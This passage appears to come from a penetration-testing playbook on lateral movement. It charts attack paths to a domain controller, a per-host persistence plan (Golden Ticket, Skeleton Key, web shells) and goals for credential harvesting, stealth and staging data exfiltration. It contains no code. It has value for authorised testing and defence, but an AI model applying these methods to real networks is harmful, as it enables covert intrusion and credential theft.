[WEB01] → SSH Key → [WS05] → PtH → [SQL01] → Token Impersonation → [DC01] Time: ~2 hours | Success Rate: High | Risk: Medium

```

**Path 2: File Server to Backup**
```

[WEB01] → Cred Reuse → [FS01] → Backup Operator Rights → [BACKUP01] → Backup Domain Admin → [DC01] Time: ~3 hours | Success Rate: Medium | Risk: Low

```

**Path 3: Certificate Authority**
```

[WEB01] → SSH Key → [WS05] → Kerberoasting → [ServiceAccount] → PtH → [CA01] → ESC Exploit → [DC01] Time: ~4 hours | Success Rate: Medium | Risk: High

```

**Path 4: SCCM Compromise**
```

[WS05] → Local Admin → [SCCM01] → Admin on All Clients → [DC01] Time: ~5 hours | Success Rate: High | Risk: Medium

**Persistence Planning**

```markdown
## 🔒 Persistence Strategy per System

| System | Primary Method | Backup Method | Detection Risk | Notes |
|--------|---------------|---------------|----------------|-------|
| DC01 | Golden Ticket | Skeleton Key | Medium | Rotate every 7 days |
| SQL01 | Service Account | Scheduled Task | Low | Database trigger option |
| FS01 | Registry Run Key | WMI Event | Low | File server access maintained |
| WEB01 | SSH Key | Cron Job | Low | Web shell backup available |
| WS05 | Startup Folder | Service | Medium | User workstation - check regularly |
```

---

## 🎯 Success Metrics

Successful lateral movement should achieve:

- ✅ **Multiple access vectors** to critical systems established
- ✅ **Domain-level compromise** achieved in AD environments
- ✅ **Comprehensive credential harvesting** with 50+ unique credentials
- ✅ **Persistent access** maintained across at least 5 key systems
- ✅ **Clear documentation** of attack paths with visual representations
- ✅ **Preparation for data exfiltration** with identified high-value targets
- ✅ **Network segmentation mapped** with access to 80%+ of subnets
- ✅ **Administrative access** on critical infrastructure (DCs, databases, file servers)
- ✅ **Stealth maintained** with minimal detection/alerting

---

## 🔄 Continuous Optimization

**After each movement phase, evaluate:**

### 📊 Effectiveness Analysis

- Which techniques were most effective?
    - Track success rates: PSExec vs WMI vs WinRM vs RDP
    - Identify most reused credentials
    - Document fastest paths to high-value targets
- Were there any detection triggers?
    - Check for account lockouts
    - Monitor for security alerts
    - Review logs if accessible
- How can movement be made more stealthy?
    - Use less common tools (WMI over PSExec)
    - Implement time delays
    - Leverage legitimate admin tools
    - Use living-off-the-land techniques

### 🔑 Credential Analysis

- What credentials provided the most access?
    - Service accounts vs user accounts
    - Local admin vs domain accounts
    - SSH keys vs passwords
- Are there patterns in password reuse?
    - Common password formats
    - Seasonal patterns (Summer2024, Winter2024)
    - Service account naming conventions
- Which credential sources were most valuable?
    - LSASS dumps
    - Configuration files
    - SSH key harvesting
    - Kerberoasting/AS-REP roasting

### 🗺️ Path Optimization

- Are there more efficient paths to high-value targets?
    - Shorter attack chains
    - Less noisy methods
    - More reliable techniques
- Which systems provide the best pivot points?
    - Jump servers
    - Management systems
    - Dual-homed hosts
- Where are the bottlenecks?
    - Network segmentation
    - Account restrictions
    - Monitoring systems

### 🛡️ Security Posture Assessment

- What security controls were encountered?
    - EDR/AV detection rates
    - Network segmentation effectiveness
    - Account restrictions (LAPS, MFA)
    - Monitoring and alerting
- What weaknesses were exploited?
    - Password reuse
    - Over-privileged accounts
    - Missing patches
    - Weak configurations
- What recommendations should be documented?
    - Immediate fixes
    - Long-term improvements
    - Detection opportunities
